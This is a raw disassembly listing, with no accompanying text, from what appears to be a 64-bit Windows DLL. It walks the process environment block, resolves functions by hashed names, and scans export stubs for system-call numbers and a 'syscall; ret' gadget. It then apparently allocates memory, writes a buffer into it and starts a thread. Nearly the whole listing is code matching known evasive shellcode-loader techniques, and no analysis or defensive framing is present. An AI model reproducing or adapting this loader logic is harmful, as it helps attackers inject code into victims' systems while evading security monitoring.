   180002cdb:	cc                   	int3
   180002cdc:	cc                   	int3
   180002cdd:	cc                   	int3
   180002cde:	cc                   	int3
   180002cdf:	cc                   	int3
   180002ce0:	48 83 ec 08          	sub    $0x8,%rsp
   180002ce4:	4c 8b c9             	mov    %rcx,%r9
   180002ce7:	4d 85 c0             	test   %r8,%r8
   180002cea:	74 13                	je     0x180002cff
   180002cec:	48 89 3c 24          	mov    %rdi,(%rsp)
   180002cf0:	48 8b f9             	mov    %rcx,%rdi
   180002cf3:	49 8b c8             	mov    %r8,%rcx
   180002cf6:	0f b6 c2             	movzbl %dl,%eax
   180002cf9:	f3 aa                	rep stos %al,(%rdi)
   180002cfb:	48 8b 3c 24          	mov    (%rsp),%rdi
   180002cff:	49 8b c1             	mov    %r9,%rax
   180002d02:	48 83 c4 08          	add    $0x8,%rsp
   180002d06:	c3                   	ret
   180002d07:	cc                   	int3
   180002d08:	cc                   	int3
   180002d09:	cc                   	int3
   180002d0a:	cc                   	int3
   180002d0b:	cc                   	int3
   180002d0c:	cc                   	int3
   180002d0d:	cc                   	int3
   180002d0e:	cc                   	int3
   180002d0f:	cc                   	int3
   180002d10:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   180002d15:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180002d1a:	41 54                	push   %r12
   180002d1c:	41 56                	push   %r14
   180002d1e:	41 57                	push   %r15
   180002d20:	48 83 ec 20          	sub    $0x20,%rsp
   180002d24:	4c 8b f2             	mov    %rdx,%r14
   180002d27:	8b e9                	mov    %ecx,%ebp
   180002d29:	85 c9                	test   %ecx,%ecx
   180002d2b:	0f 84 d9 03 00 00    	je     0x18000310a
   180002d31:	48 8b 3d d8 22 00 00 	mov    0x22d8(%rip),%rdi        # 0x180005010
   180002d38:	41 bc 4d 5a 00 00    	mov    $0x5a4d,%r12d
   180002d3e:	48 85 ff             	test   %rdi,%rdi
   180002d41:	0f 85 fc 00 00 00    	jne    0x180002e43
   180002d47:	48 39 3d e2 22 00 00 	cmp    %rdi,0x22e2(%rip)        # 0x180005030
   180002d4e:	74 16                	je     0x180002d66
   180002d50:	48 39 3d e1 22 00 00 	cmp    %rdi,0x22e1(%rip)        # 0x180005038
   180002d57:	74 0d                	je     0x180002d66
   180002d59:	48 39 3d e0 22 00 00 	cmp    %rdi,0x22e0(%rip)        # 0x180005040
   180002d60:	0f 85 dd 00 00 00    	jne    0x180002e43
   180002d66:	33 c0                	xor    %eax,%eax
   180002d68:	48 8d 3d a1 22 00 00 	lea    0x22a1(%rip),%rdi        # 0x180005010
   180002d6f:	b9 38 00 00 00       	mov    $0x38,%ecx
   180002d74:	f3 aa                	rep stos %al,(%rdi)
   180002d76:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   180002d7d:	00 00 
   180002d7f:	48 85 c0             	test   %rax,%rax
   180002d82:	0f 84 82 03 00 00    	je     0x18000310a
   180002d88:	83 b8 18 01 00 00 0a 	cmpl   $0xa,0x118(%rax)
   180002d8f:	0f 85 75 03 00 00    	jne    0x18000310a
   180002d95:	48 8b 40 18          	mov    0x18(%rax),%rax
   180002d99:	48 8b 48 20          	mov    0x20(%rax),%rcx
   180002d9d:	48 8b 39             	mov    (%rcx),%rdi
   180002da0:	48 83 ef 10          	sub    $0x10,%rdi
   180002da4:	0f 84 60 03 00 00    	je     0x18000310a
   180002daa:	48 8b 7f 30          	mov    0x30(%rdi),%rdi
   180002dae:	48 89 3d 5b 22 00 00 	mov    %rdi,0x225b(%rip)        # 0x180005010
   180002db5:	48 89 3d 5c 22 00 00 	mov    %rdi,0x225c(%rip)        # 0x180005018
   180002dbc:	66 44 39 27          	cmp    %r12w,(%rdi)
   180002dc0:	0f 85 44 03 00 00    	jne    0x18000310a
   180002dc6:	48 63 4f 3c          	movslq 0x3c(%rdi),%rcx
   180002dca:	48 03 cf             	add    %rdi,%rcx
   180002dcd:	48 89 0d 4c 22 00 00 	mov    %rcx,0x224c(%rip)        # 0x180005020
   180002dd4:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   180002dda:	0f 85 2a 03 00 00    	jne    0x18000310a
   180002de0:	8b 91 88 00 00 00    	mov    0x88(%rcx),%edx
   180002de6:	48 03 d7             	add    %rdi,%rdx
   180002de9:	48 89 15 38 22 00 00 	mov    %rdx,0x2238(%rip)        # 0x180005028
   180002df0:	0f 84 14 03 00 00    	je     0x18000310a
   180002df6:	83 7a 10 00          	cmpl   $0x0,0x10(%rdx)
   180002dfa:	0f 84 0a 03 00 00    	je     0x18000310a
   180002e00:	8b 4a 1c             	mov    0x1c(%rdx),%ecx
   180002e03:	48 03 cf             	add    %rdi,%rcx
   180002e06:	48 89 0d 23 22 00 00 	mov    %rcx,0x2223(%rip)        # 0x180005030
   180002e0d:	44 8b 42 20          	mov    0x20(%rdx),%r8d
   180002e11:	4c 03 c7             	add    %rdi,%r8
   180002e14:	4c 89 05 1d 22 00 00 	mov    %r8,0x221d(%rip)        # 0x180005038
   180002e1b:	8b 52 24             	mov    0x24(%rdx),%edx
   180002e1e:	48 03 d7             	add    %rdi,%rdx
   180002e21:	48 89 15 18 22 00 00 	mov    %rdx,0x2218(%rip)        # 0x180005040
   180002e28:	48 85 c9             	test   %rcx,%rcx
   180002e2b:	0f 84 d9 02 00 00    	je     0x18000310a
   180002e31:	4d 85 c0             	test   %r8,%r8
   180002e34:	0f 84 d0 02 00 00    	je     0x18000310a
   180002e3a:	48 85 d2             	test   %rdx,%rdx
   180002e3d:	0f 84 c7 02 00 00    	je     0x18000310a
   180002e43:	48 8b 05 de 21 00 00 	mov    0x21de(%rip),%rax        # 0x180005028
   180002e4a:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   180002e4f:	33 db                	xor    %ebx,%ebx
   180002e51:	44 8d 7b 01          	lea    0x1(%rbx),%r15d
   180002e55:	39 58 14             	cmp    %ebx,0x14(%rax)
   180002e58:	0f 86 de 01 00 00    	jbe    0x18000303c
   180002e5e:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   180002e63:	48 8b 05 ce 21 00 00 	mov    0x21ce(%rip),%rax        # 0x180005038
   180002e6a:	8b 0c 98             	mov    (%rax,%rbx,4),%ecx
   180002e6d:	48 03 cf             	add    %rdi,%rcx
   180002e70:	e8 4b 0e 00 00       	call   0x180003cc0
   180002e75:	3b c5                	cmp    %ebp,%eax
   180002e77:	75 63                	jne    0x180002edc
   180002e79:	41 89 2e             	mov    %ebp,(%r14)
   180002e7c:	48 8b 05 bd 21 00 00 	mov    0x21bd(%rip),%rax        # 0x180005040
   180002e83:	0f b7 0c 58          	movzwl (%rax,%rbx,2),%ecx
   180002e87:	48 8b 05 a2 21 00 00 	mov    0x21a2(%rip),%rax        # 0x180005030
   180002e8e:	8b 14 88             	mov    (%rax,%rcx,4),%edx
   180002e91:	48 03 15 78 21 00 00 	add    0x2178(%rip),%rdx        # 0x180005010
   180002e98:	49 89 56 08          	mov    %rdx,0x8(%r14)
   180002e9c:	0f b6 02             	movzbl (%rdx),%eax
   180002e9f:	3c 4c                	cmp    $0x4c,%al
   180002ea1:	75 2b                	jne    0x180002ece
   180002ea3:	80 7a 01 8b          	cmpb   $0x8b,0x1(%rdx)
   180002ea7:	75 2d                	jne    0x180002ed6
   180002ea9:	80 7a 02 d1          	cmpb   $0xd1,0x2(%rdx)
   180002ead:	75 27                	jne    0x180002ed6
   180002eaf:	80 7a 03 b8          	cmpb   $0xb8,0x3(%rdx)
   180002eb3:	75 21                	jne    0x180002ed6
   180002eb5:	80 7a 06 00          	cmpb   $0x0,0x6(%rdx)
   180002eb9:	75 21                	jne    0x180002edc
   180002ebb:	80 7a 07 00          	cmpb   $0x0,0x7(%rdx)
   180002ebf:	75 1b                	jne    0x180002edc
   180002ec1:	0f b6 4a 05          	movzbl 0x5(%rdx),%ecx
   180002ec5:	0f b6 42 04          	movzbl 0x4(%rdx),%eax
   180002ec9:	e9 60 01 00 00       	jmp    0x18000302e
   180002ece:	3c e9                	cmp    $0xe9,%al
   180002ed0:	0f 84 c9 00 00 00    	je     0x180002f9f
   180002ed6:	80 7a 03 e9          	cmpb   $0xe9,0x3(%rdx)
   180002eda:	74 1e                	je     0x180002efa
   180002edc:	48 8b 05 45 21 00 00 	mov    0x2145(%rip),%rax        # 0x180005028
   180002ee3:	ff c3                	inc    %ebx
   180002ee5:	3b 58 14             	cmp    0x14(%rax),%ebx
   180002ee8:	0f 83 49 01 00 00    	jae    0x180003037
   180002eee:	48 8b 3d 1b 21 00 00 	mov    0x211b(%rip),%rdi        # 0x180005010
   180002ef5:	e9 69 ff ff ff       	jmp    0x180002e63
   180002efa:	41 0f b7 cf          	movzwl %r15w,%ecx
   180002efe:	41 b8 f4 01 00 00    	mov    $0x1f4,%r8d
   180002f04:	0f 1f 40 00          	nopl   0x0(%rax)
   180002f08:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   180002f0f:	00 
   180002f10:	0f b7 f9             	movzwl %cx,%edi
   180002f13:	8b c7                	mov    %edi,%eax
   180002f15:	c1 e0 05             	shl    $0x5,%eax
   180002f18:	48 03 c2             	add    %rdx,%rax
   180002f1b:	80 38 4c             	cmpb   $0x4c,(%rax)
   180002f1e:	75 1e                	jne    0x180002f3e
   180002f20:	80 78 01 8b          	cmpb   $0x8b,0x1(%rax)
   180002f24:	75 18                	jne    0x180002f3e
   180002f26:	80 78 02 d1          	cmpb   $0xd1,0x2(%rax)
   180002f2a:	75 12                	jne    0x180002f3e
   180002f2c:	80 78 03 b8          	cmpb   $0xb8,0x3(%rax)
   180002f30:	75 0c                	jne    0x180002f3e
   180002f32:	80 78 06 00          	cmpb   $0x0,0x6(%rax)
   180002f36:	75 06                	jne    0x180002f3e
   180002f38:	80 78 07 00          	cmpb   $0x0,0x7(%rax)
   180002f3c:	74 3d                	je     0x180002f7b
   180002f3e:	8b c7                	mov    %edi,%eax
   180002f40:	f7 d8                	neg    %eax
   180002f42:	c1 e0 05             	shl    $0x5,%eax
   180002f45:	48 98                	cltq
   180002f47:	48 03 c2             	add    %rdx,%rax
   180002f4a:	80 38 4c             	cmpb   $0x4c,(%rax)
   180002f4d:	75 1e                	jne    0x180002f6d
   180002f4f:	80 78 01 8b          	cmpb   $0x8b,0x1(%rax)
   180002f53:	75 18                	jne    0x180002f6d
   180002f55:	80 78 02 d1          	cmpb   $0xd1,0x2(%rax)
   180002f59:	75 12                	jne    0x180002f6d
   180002f5b:	80 78 03 b8          	cmpb   $0xb8,0x3(%rax)
   180002f5f:	75 0c                	jne    0x180002f6d
   180002f61:	80 78 06 00          	cmpb   $0x0,0x6(%rax)
   180002f65:	75 06                	jne    0x180002f6d
   180002f67:	80 78 07 00          	cmpb   $0x0,0x7(%rax)
   180002f6b:	74 20                	je     0x180002f8d
   180002f6d:	66 ff c1             	inc    %cx
   180002f70:	66 41 3b c8          	cmp    %r8w,%cx
   180002f74:	76 9a                	jbe    0x180002f10
   180002f76:	e9 bc 00 00 00       	jmp    0x180003037
   180002f7b:	0f b6 48 04          	movzbl 0x4(%rax),%ecx
   180002f7f:	0f b6 40 05          	movzbl 0x5(%rax),%eax
   180002f83:	2b cf                	sub    %edi,%ecx
   180002f85:	c1 e0 08             	shl    $0x8,%eax
   180002f88:	e9 a4 00 00 00       	jmp    0x180003031
   180002f8d:	0f b6 48 04          	movzbl 0x4(%rax),%ecx
   180002f91:	0f b6 40 05          	movzbl 0x5(%rax),%eax
   180002f95:	03 cf                	add    %edi,%ecx
   180002f97:	c1 e0 08             	shl    $0x8,%eax
   180002f9a:	e9 92 00 00 00       	jmp    0x180003031
   180002f9f:	41 0f b7 cf          	movzwl %r15w,%ecx
   180002fa3:	41 b8 f4 01 00 00    	mov    $0x1f4,%r8d
   180002fa9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180002fb0:	0f b7 f9             	movzwl %cx,%edi
   180002fb3:	8b c7                	mov    %edi,%eax
   180002fb5:	c1 e0 05             	shl    $0x5,%eax
   180002fb8:	48 03 c2             	add    %rdx,%rax
   180002fbb:	80 38 4c             	cmpb   $0x4c,(%rax)
   180002fbe:	75 1e                	jne    0x180002fde
   180002fc0:	80 78 01 8b          	cmpb   $0x8b,0x1(%rax)
   180002fc4:	75 18                	jne    0x180002fde
   180002fc6:	80 78 02 d1          	cmpb   $0xd1,0x2(%rax)
   180002fca:	75 12                	jne    0x180002fde
   180002fcc:	80 78 03 b8          	cmpb   $0xb8,0x3(%rax)
   180002fd0:	75 0c                	jne    0x180002fde
   180002fd2:	80 78 06 00          	cmpb   $0x0,0x6(%rax)
   180002fd6:	75 06                	jne    0x180002fde
   180002fd8:	80 78 07 00          	cmpb   $0x0,0x7(%rax)
   180002fdc:	74 3a                	je     0x180003018
   180002fde:	8b c7                	mov    %edi,%eax
   180002fe0:	f7 d8                	neg    %eax
   180002fe2:	c1 e0 05             	shl    $0x5,%eax
   180002fe5:	48 98                	cltq
   180002fe7:	48 03 c2             	add    %rdx,%rax
   180002fea:	80 38 4c             	cmpb   $0x4c,(%rax)
   180002fed:	75 1e                	jne    0x18000300d
   180002fef:	80 78 01 8b          	cmpb   $0x8b,0x1(%rax)
   180002ff3:	75 18                	jne    0x18000300d
   180002ff5:	80 78 02 d1          	cmpb   $0xd1,0x2(%rax)
   180002ff9:	75 12                	jne    0x18000300d
   180002ffb:	80 78 03 b8          	cmpb   $0xb8,0x3(%rax)
   180002fff:	75 0c                	jne    0x18000300d
   180003001:	80 78 06 00          	cmpb   $0x0,0x6(%rax)
   180003005:	75 06                	jne    0x18000300d
   180003007:	80 78 07 00          	cmpb   $0x0,0x7(%rax)
   18000300b:	74 17                	je     0x180003024
   18000300d:	66 ff c1             	inc    %cx
   180003010:	66 41 3b c8          	cmp    %r8w,%cx
   180003014:	76 9a                	jbe    0x180002fb0
   180003016:	eb 1f                	jmp    0x180003037
   180003018:	0f b6 48 05          	movzbl 0x5(%rax),%ecx
   18000301c:	0f b6 40 04          	movzbl 0x4(%rax),%eax
   180003020:	2b c7                	sub    %edi,%eax
   180003022:	eb 0a                	jmp    0x18000302e
   180003024:	0f b6 48 05          	movzbl 0x5(%rax),%ecx
   180003028:	0f b6 40 04          	movzbl 0x4(%rax),%eax
   18000302c:	03 c7                	add    %edi,%eax
   18000302e:	c1 e1 08             	shl    $0x8,%ecx
   180003031:	0b c8                	or     %eax,%ecx
   180003033:	41 89 4e 04          	mov    %ecx,0x4(%r14)
   180003037:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   18000303c:	49 83 7e 08 00       	cmpq   $0x0,0x8(%r14)
   180003041:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180003046:	0f 84 be 00 00 00    	je     0x18000310a
   18000304c:	41 83 7e 04 00       	cmpl   $0x0,0x4(%r14)
   180003051:	0f 84 b3 00 00 00    	je     0x18000310a
   180003057:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   18000305e:	00 00 
   180003060:	48 8b 48 18          	mov    0x18(%rax),%rcx
   180003064:	48 8b 79 20          	mov    0x20(%rcx),%rdi
   180003068:	48 85 ff             	test   %rdi,%rdi
   18000306b:	74 7c                	je     0x1800030e9
   18000306d:	0f 1f 00             	nopl   (%rax)
   180003070:	66 83 7f 48 00       	cmpw   $0x0,0x48(%rdi)
   180003075:	74 72                	je     0x1800030e9
   180003077:	48 8b 4f 50          	mov    0x50(%rdi),%rcx
   18000307b:	e8 40 0c 00 00       	call   0x180003cc0
   180003080:	3d 12 0b af 1c       	cmp    $0x1caf0b12,%eax
   180003085:	74 10                	je     0x180003097
   180003087:	48 8b 4f 50          	mov    0x50(%rdi),%rcx
   18000308b:	e8 30 0c 00 00       	call   0x180003cc0
   180003090:	3d da 2b f1 27       	cmp    $0x27f12bda,%eax
   180003095:	75 4a                	jne    0x1800030e1
   180003097:	48 8b 4f 20          	mov    0x20(%rdi),%rcx
   18000309b:	66 44 39 21          	cmp    %r12w,(%rcx)
   18000309f:	75 61                	jne    0x180003102
   1800030a1:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   1800030a5:	81 3c 08 50 45 00 00 	cmpl   $0x4550,(%rax,%rcx,1)
   1800030ac:	75 54                	jne    0x180003102
   1800030ae:	8b 54 08 2c          	mov    0x2c(%rax,%rcx,1),%edx
   1800030b2:	44 8b 44 08 1c       	mov    0x1c(%rax,%rcx,1),%r8d
   1800030b7:	48 03 d1             	add    %rcx,%rdx
   1800030ba:	4d 85 c0             	test   %r8,%r8
   1800030bd:	74 22                	je     0x1800030e1
   1800030bf:	48 8b ca             	mov    %rdx,%rcx
   1800030c2:	80 39 0f             	cmpb   $0xf,(%rcx)
   1800030c5:	75 0c                	jne    0x1800030d3
   1800030c7:	80 79 01 05          	cmpb   $0x5,0x1(%rcx)
   1800030cb:	75 06                	jne    0x1800030d3
   1800030cd:	80 79 02 c3          	cmpb   $0xc3,0x2(%rcx)
   1800030d1:	74 26                	je     0x1800030f9
   1800030d3:	48 ff c1             	inc    %rcx
   1800030d6:	48 8b c1             	mov    %rcx,%rax
   1800030d9:	48 2b c2             	sub    %rdx,%rax
   1800030dc:	49 3b c0             	cmp    %r8,%rax
   1800030df:	72 e1                	jb     0x1800030c2
   1800030e1:	48 8b 3f             	mov    (%rdi),%rdi
   1800030e4:	48 85 ff             	test   %rdi,%rdi
   1800030e7:	75 87                	jne    0x180003070
   1800030e9:	45 33 ff             	xor    %r15d,%r15d
   1800030ec:	4d 39 7e 10          	cmp    %r15,0x10(%r14)
   1800030f0:	41 0f 95 c7          	setne  %r15b
   1800030f4:	41 8b c7             	mov    %r15d,%eax
   1800030f7:	eb 13                	jmp    0x18000310c
   1800030f9:	49 89 4e 10          	mov    %rcx,0x10(%r14)
   1800030fd:	41 8b c7             	mov    %r15d,%eax
   180003100:	eb 0a                	jmp    0x18000310c
   180003102:	45 33 ff             	xor    %r15d,%r15d
   180003105:	41 8b c7             	mov    %r15d,%eax
   180003108:	eb 02                	jmp    0x18000310c
   18000310a:	33 c0                	xor    %eax,%eax
   18000310c:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   180003111:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   180003116:	48 83 c4 20          	add    $0x20,%rsp
   18000311a:	41 5f                	pop    %r15
   18000311c:	41 5e                	pop    %r14
   18000311e:	41 5c                	pop    %r12
   180003120:	c3                   	ret
   180003121:	cc                   	int3
   180003122:	cc                   	int3
   180003123:	cc                   	int3
   180003124:	cc                   	int3
   180003125:	cc                   	int3
   180003126:	cc                   	int3
   180003127:	cc                   	int3
   180003128:	cc                   	int3
   180003129:	cc                   	int3
   18000312a:	cc                   	int3
   18000312b:	cc                   	int3
   18000312c:	cc                   	int3
   18000312d:	cc                   	int3
   18000312e:	cc                   	int3
   18000312f:	cc                   	int3
   180003130:	48 83 ec 38          	sub    $0x38,%rsp
   180003134:	45 33 c9             	xor    %r9d,%r9d
   180003137:	45 33 c0             	xor    %r8d,%r8d
   18000313a:	33 d2                	xor    %edx,%edx
   18000313c:	33 c9                	xor    %ecx,%ecx
   18000313e:	ff 15 e4 0e 00 00    	call   *0xee4(%rip)        # 0x180004028
   180003144:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180003149:	48 85 c0             	test   %rax,%rax
   18000314c:	74 2f                	je     0x18000317d
   18000314e:	41 b9 ff 1c 00 00    	mov    $0x1cff,%r9d
   180003154:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   18000315b:	00 
   18000315c:	41 b8 70 17 00 00    	mov    $0x1770,%r8d
   180003162:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   180003167:	b9 01 00 00 00       	mov    $0x1,%ecx
   18000316c:	ff 15 e6 0e 00 00    	call   *0xee6(%rip)        # 0x180004058
   180003172:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   180003177:	ff 15 a3 0e 00 00    	call   *0xea3(%rip)        # 0x180004020
   18000317d:	33 c9                	xor    %ecx,%ecx
   18000317f:	ff 15 ab 0e 00 00    	call   *0xeab(%rip)        # 0x180004030
   180003185:	cc                   	int3
   180003186:	cc                   	int3
   180003187:	cc                   	int3
   180003188:	cc                   	int3
   180003189:	cc                   	int3
   18000318a:	cc                   	int3
   18000318b:	cc                   	int3
   18000318c:	cc                   	int3
   18000318d:	cc                   	int3
   18000318e:	cc                   	int3
   18000318f:	cc                   	int3
   180003190:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003195:	57                   	push   %rdi
   180003196:	48 83 ec 20          	sub    $0x20,%rsp
   18000319a:	b9 91 ef 30 60       	mov    $0x6030ef91,%ecx
   18000319f:	e8 5c de ff ff       	call   0x180001000
   1800031a4:	b9 1e 53 8b 99       	mov    $0x998b531e,%ecx
   1800031a9:	48 8b f8             	mov    %rax,%rdi
   1800031ac:	e8 4f de ff ff       	call   0x180001000
   1800031b1:	48 8b d8             	mov    %rax,%rbx
   1800031b4:	48 85 ff             	test   %rdi,%rdi
   1800031b7:	0f 84 fb 00 00 00    	je     0x1800032b8
   1800031bd:	48 85 c0             	test   %rax,%rax
   1800031c0:	0f 84 f2 00 00 00    	je     0x1800032b8
   1800031c6:	ba eb 2f 76 e0       	mov    $0xe0762feb,%edx
   1800031cb:	48 8b cf             	mov    %rdi,%rcx
   1800031ce:	e8 0d df ff ff       	call   0x1800010e0
   1800031d3:	ba 97 1a 2d 5c       	mov    $0x5c2d1a97,%edx
   1800031d8:	48 89 05 71 1e 00 00 	mov    %rax,0x1e71(%rip)        # 0x180005050
   1800031df:	48 8b cf             	mov    %rdi,%rcx
   1800031e2:	e8 f9 de ff ff       	call   0x1800010e0
   1800031e7:	ba 5a 46 73 20       	mov    $0x2073465a,%edx
   1800031ec:	48 89 05 65 1e 00 00 	mov    %rax,0x1e65(%rip)        # 0x180005058
   1800031f3:	48 8b cf             	mov    %rdi,%rcx
   1800031f6:	e8 e5 de ff ff       	call   0x1800010e0
   1800031fb:	ba 90 03 5b 23       	mov    $0x235b0390,%edx
   180003200:	48 89 05 59 1e 00 00 	mov    %rax,0x1e59(%rip)        # 0x180005060
   180003207:	48 8b cf             	mov    %rdi,%rcx
   18000320a:	e8 d1 de ff ff       	call   0x1800010e0
   18000320f:	ba 28 89 8a f0       	mov    $0xf08a8928,%edx
   180003214:	48 89 05 4d 1e 00 00 	mov    %rax,0x1e4d(%rip)        # 0x180005068
   18000321b:	48 8b cf             	mov    %rdi,%rcx
   18000321e:	e8 bd de ff ff       	call   0x1800010e0
   180003223:	ba 11 39 15 ef       	mov    $0xef153911,%edx
   180003228:	48 89 05 41 1e 00 00 	mov    %rax,0x1e41(%rip)        # 0x180005070
   18000322f:	48 8b cb             	mov    %rbx,%rcx
   180003232:	e8 a9 de ff ff       	call   0x1800010e0
   180003237:	ba 76 b8 f3 c1       	mov    $0xc1f3b876,%edx
   18000323c:	48 89 05 35 1e 00 00 	mov    %rax,0x1e35(%rip)        # 0x180005078
   180003243:	48 8b cb             	mov    %rbx,%rcx
   180003246:	e8 95 de ff ff       	call   0x1800010e0
   18000324b:	ba 14 31 8b 23       	mov    $0x238b3114,%edx
   180003250:	48 89 05 29 1e 00 00 	mov    %rax,0x1e29(%rip)        # 0x180005080
   180003257:	48 8b cb             	mov    %rbx,%rcx
   18000325a:	e8 81 de ff ff       	call   0x1800010e0
   18000325f:	ba 07 77 19 f5       	mov    $0xf5197707,%edx
   180003264:	48 89 05 1d 1e 00 00 	mov    %rax,0x1e1d(%rip)        # 0x180005088
   18000326b:	48 8b cb             	mov    %rbx,%rcx
   18000326e:	e8 6d de ff ff       	call   0x1800010e0
   180003273:	ba f4 15 93 b0       	mov    $0xb09315f4,%edx
   180003278:	48 89 05 11 1e 00 00 	mov    %rax,0x1e11(%rip)        # 0x180005090
   18000327f:	48 8b cb             	mov    %rbx,%rcx
   180003282:	e8 59 de ff ff       	call   0x1800010e0
   180003287:	48 89 05 0a 1e 00 00 	mov    %rax,0x1e0a(%rip)        # 0x180005098
   18000328e:	33 c9                	xor    %ecx,%ecx
   180003290:	48 8d 05 b9 1d 00 00 	lea    0x1db9(%rip),%rax        # 0x180005050
   180003297:	48 83 38 00          	cmpq   $0x0,(%rax)
   18000329b:	74 1b                	je     0x1800032b8
   18000329d:	ff c1                	inc    %ecx
   18000329f:	48 83 c0 08          	add    $0x8,%rax
   1800032a3:	83 f9 0a             	cmp    $0xa,%ecx
   1800032a6:	72 ef                	jb     0x180003297
   1800032a8:	b8 01 00 00 00       	mov    $0x1,%eax
   1800032ad:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800032b2:	48 83 c4 20          	add    $0x20,%rsp
   1800032b6:	5f                   	pop    %rdi
   1800032b7:	c3                   	ret
   1800032b8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800032bd:	33 c0                	xor    %eax,%eax
   1800032bf:	48 83 c4 20          	add    $0x20,%rsp
   1800032c3:	5f                   	pop    %rdi
   1800032c4:	c3                   	ret
   1800032c5:	cc                   	int3
   1800032c6:	cc                   	int3
   1800032c7:	cc                   	int3
   1800032c8:	cc                   	int3
   1800032c9:	cc                   	int3
   1800032ca:	cc                   	int3
   1800032cb:	cc                   	int3
   1800032cc:	cc                   	int3
   1800032cd:	cc                   	int3
   1800032ce:	cc                   	int3
   1800032cf:	cc                   	int3
   1800032d0:	48 8b c4             	mov    %rsp,%rax
   1800032d3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1800032d7:	48 89 50 10          	mov    %rdx,0x10(%rax)
   1800032db:	55                   	push   %rbp
   1800032dc:	56                   	push   %rsi
   1800032dd:	57                   	push   %rdi
   1800032de:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   1800032e5:	33 ed                	xor    %ebp,%ebp
   1800032e7:	48 89 50 d8          	mov    %rdx,-0x28(%rax)
   1800032eb:	48 89 68 b8          	mov    %rbp,-0x48(%rax)
   1800032ef:	49 8b f0             	mov    %r8,%rsi
   1800032f2:	48 89 68 b0          	mov    %rbp,-0x50(%rax)
   1800032f6:	48 8b f9             	mov    %rcx,%rdi
   1800032f9:	48 89 68 a8          	mov    %rbp,-0x58(%rax)
   1800032fd:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   180003302:	48 89 68 a0          	mov    %rbp,-0x60(%rax)
   180003306:	4c 8d 4d ff          	lea    -0x1(%rbp),%r9
   18000330a:	c7 40 98 01 00 00 00 	movl   $0x1,-0x68(%rax)
   180003311:	45 33 c0             	xor    %r8d,%r8d
   180003314:	48 89 68 90          	mov    %rbp,-0x70(%rax)
   180003318:	ba ff ff 1f 00       	mov    $0x1fffff,%edx
   18000331d:	48 89 68 d0          	mov    %rbp,-0x30(%rax)
   180003321:	48 89 68 c8          	mov    %rbp,-0x38(%rax)
   180003325:	89 68 20             	mov    %ebp,0x20(%rax)
   180003328:	48 8d 05 01 fe ff ff 	lea    -0x1ff(%rip),%rax        # 0x180003130
   18000332f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180003334:	ff 15 26 1d 00 00    	call   *0x1d26(%rip)        # 0x180005060
   18000333a:	85 c0                	test   %eax,%eax
   18000333c:	0f 88 fb 00 00 00    	js     0x18000343d
   180003342:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   180003349:	00 
   18000334a:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   18000334f:	45 33 c0             	xor    %r8d,%r8d
   180003352:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   180003359:	00 
   18000335a:	48 8d 54 24 68       	lea    0x68(%rsp),%rdx
   18000335f:	48 8d 4d ff          	lea    -0x1(%rbp),%rcx
   180003363:	ff 15 e7 1c 00 00    	call   *0x1ce7(%rip)        # 0x180005050
   180003369:	85 c0                	test   %eax,%eax
   18000336b:	0f 88 cc 00 00 00    	js     0x18000343d
   180003371:	8b dd                	mov    %ebp,%ebx
   180003373:	48 39 9c 24 a8 00 00 	cmp    %rbx,0xa8(%rsp)
   18000337a:	00 
   18000337b:	76 40                	jbe    0x1800033bd
   18000337d:	0f 1f 00             	nopl   (%rax)
   180003380:	0f b6 0c 3b          	movzbl (%rbx,%rdi,1),%ecx
   180003384:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   18000338a:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   18000338f:	48 8b 15 e2 1c 00 00 	mov    0x1ce2(%rip),%rdx        # 0x180005078
   180003396:	4c 03 c3             	add    %rbx,%r8
   180003399:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   18000339d:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   1800033a2:	ff 15 c0 1c 00 00    	call   *0x1cc0(%rip)        # 0x180005068
   1800033a8:	85 c0                	test   %eax,%eax
   1800033aa:	0f 88 8d 00 00 00    	js     0x18000343d
   1800033b0:	48 ff c3             	inc    %rbx
   1800033b3:	48 3b 9c 24 a8 00 00 	cmp    0xa8(%rsp),%rbx
   1800033ba:	00 
   1800033bb:	72 c3                	jb     0x180003380
   1800033bd:	48 8b 15 94 1d 00 00 	mov    0x1d94(%rip),%rdx        # 0x180005158
   1800033c4:	8b 0d 82 1d 00 00    	mov    0x1d82(%rip),%ecx        # 0x18000514c
   1800033ca:	e8 a1 0a 00 00       	call   0x180003e70
   1800033cf:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   1800033d4:	33 d2                	xor    %edx,%edx
   1800033d6:	e8 a3 0a 00 00       	call   0x180003e7e
   1800033db:	85 c0                	test   %eax,%eax
   1800033dd:	78 5e                	js     0x18000343d
   1800033df:	45 33 c0             	xor    %r8d,%r8d
   1800033e2:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
